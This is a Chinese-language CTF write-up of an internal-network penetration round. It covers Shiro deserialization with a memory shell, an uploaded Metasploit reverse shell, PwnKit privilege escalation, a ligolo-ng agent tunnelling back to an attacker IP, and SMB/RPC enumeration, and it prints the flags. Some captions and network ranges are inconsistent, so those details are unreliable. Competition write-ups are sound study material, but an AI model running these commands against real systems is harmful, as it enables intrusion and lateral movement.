---
title: 长城杯半决赛 Writeup
date: 2026-07-13 18:40:00 +0800
categories: [比赛wp]
tags: [CTF, 长城杯, 内网渗透]
media_subpath: /assets/image/great-wall-cup-semifinal/
---

> 本次比赛 ISW 赛道前五解题记录，涉及 Web 漏洞利用、内网渗透、权限提升及横向移动等技术。

---

## Flag 1：Shiro 反序列化漏洞获取 Shell

### 信息收集

使用 `fscan` 对目标进行端口扫描，发现目标使用了 **Apache Shiro** 框架，并成功获取到 Shiro 的初始密钥（Default Key）。

### 漏洞利用

利用 Shiro 反序列化漏洞，使用工具注入内存马（Memory Shell），然后通过 **Godzilla（哥斯拉）** 连接内存马，成功获取第一个 flag。

![爆破成功截图](image_5.png)

---

## Flag 2：MSF 反向代理与本地提权

### 在 Godzilla 上运行 MSF

通过 Godzilla 上传 Metasploit Framework（MSF）的反向 Shell Payload 并执行。

### 建立代理路由

在 MSF 中添加路由，使攻击者能够通过跳板访问内网资源：

```bash
run post/multi/manage/autoroute  # 添加路由
run post/multi/recon/local_exploit_suggester  # 自动检测 Linux 可利用提权漏洞
```

![内网SMB扫描](image_4.png)

### 本地提权（PwnKit）

利用 **CVE-2021-4034（PwnKit）** 本地提权漏洞实现权限提升：

![Ligolo-ng配置](image_3.png)

```bash
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
# 配置 rhost 即可实现提权
```

提权成功后获取 flag：

```
flag{4235f9c23302d9899b0ce5751bedbfb9}
```

---

## Flag 3：内网横向移动（Ligolo-ng 代理）

### 使用 Godzilla 上传代理工具

通过 Godzilla 上传 **ligolo-ng_agent_0.8.3** 代理工具到目标机器。

### 配置 Ligolo-ng 隧道

**Kali 攻击机端（监听）：**

```bash
proxy.exe -selfcert
```

**目标机器端（连接）：**

```bash
chmod +x agent
./agent -connect 10.11.114.51:11601 -ignore-cert
```

![MSF提权](image_2.png)

### 创建虚拟网卡并配置路由

```bash
# 创建虚拟网卡
ip tuntap add user root mode tun ligolo
ip link set ligolo up

# 添加路由（目标内网网段 10.10.10.0/24）
ip route add 10.10.10.0/24 dev ligolo
```

### MSF 内网扫描

通过 MSF 使用 TCP 扫描器探测内网主机：

```bash
run post/multi/manage/autoroute  # 添加路由
use auxiliary/scanner/portscan/tcp    # 扫描内网端口
```

扫描发现目标内网主机 `192.168.45.100` 开放了以下端口：

```
[+] 192.168.45.100 - 192.168.45.100:22 - TCP OPEN
[+] 192.168.45.100 - 192.168.45.100:445 - TCP OPEN
[+] 192.168.45.100 - 192.168.45.100:135 - TCP OPEN
```

### 服务识别

使用 `nmap` 对 445 端口进行服务版本探测：

```bash
nmap -sV -p 445 192.168.45.100
```

确认结果：

```
PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4
```

目标运行 **Samba 4 + SMBv2.1**。

### SMB 枚举与爆破

使用 `fscan` 进一步扫描确认：

```bash
./fscan -h 192.168.45.100
```

扫描结果如下（开放端口 22, 88, 135, 139, 445）：

```
start infoscan
192.168.45.100:139 open
192.168.45.100:88 open
192.168.45.100:135 open
192.168.45.100:445 open
192.168.45.100:22 open
[*] alive ports len is: 5
start vulscan
已完成 5/5
```

**Samba 4.23.4** 为较旧版本，尝试 SMBSQL 利用失败后，空会话访问被拒绝。

### 使用 rpcclient 获取域信息

```bash
rpcclient -U '' -N 192.168.45.100
```

获取到以下信息：

- **Domain Name:** CORE
- **Domain Sid:** S-1-5-21-570020094-3305702439-2136953277
- **用户列表：**

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[flag] rid:[0x450]
```

### 爆破获取 Flag

使用 **enum4linux** 进行 SMB 枚举：

```bash
enum4linux -a 192.168.45.100
```

![enum4linux扫描结果](image_1.png)

通过枚举和爆破最终获取 flag：

```
flag{a9f6bba6e4d62a9a4a5a0694141ebe79}
```

---

## 后续思路（未成功）

- 弱口令枚举（未爆破成功）
- Samba 4.23.4 漏洞利用
- 88 端口（Kerberos）和 135 端口（RPC）利用

---

## 总结

本次比赛中湖北省解出 3 个 Flag 即在 ISW 赛道排名前五。主要技术点包括：

| 阶段 | 技术 |
|------|------|
| Web 漏洞 | Shiro 反序列化 + 内存马注入 |
| 权限提升 | CVE-2021-4034 (PwnKit) 本地提权 |
| 横向移动 | Ligolo-ng 代理隧道 |
| 内网扫描 | MSF + fscan + nmap |
| 服务利用 | SMB/RPC 枚举 + 信息收集 |

感觉大家的内网渗透都没有系统的学习过。
